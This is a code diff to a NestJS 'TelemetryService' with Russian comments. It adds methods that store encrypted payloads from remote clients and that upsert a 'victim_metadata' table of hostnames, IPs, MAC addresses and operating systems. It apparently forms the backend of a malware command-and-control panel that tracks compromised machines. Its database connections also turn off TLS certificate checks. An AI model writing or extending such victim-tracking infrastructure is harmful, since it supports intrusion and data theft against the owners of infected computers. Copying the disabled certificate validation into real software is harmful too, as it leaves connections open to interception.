@@ -180,6 +180,7 @@
 
 import { Injectable, InternalServerErrorException } from '@nestjs/common';
 import { ConfigService } from '@nestjs/config';
+import { Client } from 'pg';
 import * as crypto from 'crypto';
 
 @Injectable()
@@ -256,5 +257,84 @@ export class TelemetryService {
 
   async cleanupOldData(): Promise<void> {
     console.log('cleanupOldData STUB');
+  }
+
+  /**
+   * Сохранение лога телеметрии
+   */
+  async saveTelemetryLog(
+    clientId: string,
+    timestamp: string,
+    data: string,
+  ): Promise<string> {
+    const db = new Client({
+      connectionString: process.env.DATABASE_URL,
+      ssl: { rejectUnauthorized: false },
+    });
+
+    try {
+      await db.connect();
+      
+      let encryptedPayload: Buffer | null = null;
+      let payloadSize = 0;
+      
+      if (data && data.length > 0) {
+        try {
+          encryptedPayload = Buffer.from(data, 'base64');
+          payloadSize = encryptedPayload.length;
+        } catch (error) {
+          // Если не base64, сохраняем как есть
+          encryptedPayload = Buffer.from(data, 'utf8');
+          payloadSize = encryptedPayload.length;
+        }
+      }
+      
+      const result = await db.query(
+        `INSERT INTO telemetry_logs (client_id, timestamp, encrypted_payload, payload_size)
+         VALUES ($1, $2, $3, $4)
+         RETURNING id`,
+        [clientId, timestamp, encryptedPayload, payloadSize],
+      );
+
+      return result.rows[0].id;
+    } finally {
+      await db.end();
+    }
+  }
+
+  /**
+   * Обновление метаданных жертвы
+   */
+  async updateVictimMetadata(clientId: string, frontendData: any): Promise<void> {
+    const db = new Client({
+      connectionString: process.env.DATABASE_URL,
+      ssl: { rejectUnauthorized: false },
+    });
+
+    try {
+      await db.connect();
+      
+      // Извлекаем данные из frontend_data
+      const hostname = frontendData.hostname || null;
+      const ip = frontendData.ip || null;
+      const mac = frontendData.mac || null;
+      const os = frontendData.os || null;
+
+      // Используем UPSERT для обновления или создания записи
+      await db.query(
+        `INSERT INTO victim_metadata (client_id, hostname, ip, mac, os, last_updated)
+         VALUES ($1, $2, $3, $4, $5, NOW())
+         ON CONFLICT (client_id)
+         DO UPDATE SET
+           hostname = COALESCE(EXCLUDED.hostname, victim_metadata.hostname),
+           ip = COALESCE(EXCLUDED.ip, victim_metadata.ip),
+           mac = COALESCE(EXCLUDED.mac, victim_metadata.mac),
+           os = COALESCE(EXCLUDED.os, victim_metadata.os),
+           last_updated = NOW()`,
+        [clientId, hostname, ip, mac, os],
+      );
+    } finally {
+      await db.end();
+    }
   }
 }
